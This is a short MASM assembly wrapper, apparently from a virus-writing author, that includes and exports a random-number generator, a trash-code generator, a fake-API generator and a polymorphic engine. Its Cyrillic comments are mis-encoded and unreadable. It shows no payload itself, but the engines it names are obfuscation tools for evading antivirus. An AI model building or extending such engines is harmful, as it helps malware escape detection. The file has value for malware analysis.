;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;										  																 ;
;										  ���� ������� 													 ;
;									 RANG32, xTG, FAKA, iRPE									 		 ; 
;					(rang32.asm, faka.asm, xtg.inc, xtg.asm, logic.asm, irpe.asm)						 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;



																;m1x
																;pr0mix@mail.ru
																;������� ��� ᥡ�...�����⢮ ��筮 



.386 
.model flat, stdcall
option casemap:none



include windows.inc



.code

public RANG32															;GPRN; 
public xTG																;TrashGen;
public FAKA																;FakeApi Generator;
public iRPE																;Polymorph Engine;

xengines:

include		rang32.asm													;������祭�� �������
include		xtg.inc	
include		xtg.asm
include		faka.asm
include		logic.asm
include		irpe.asm

end xengines
 





 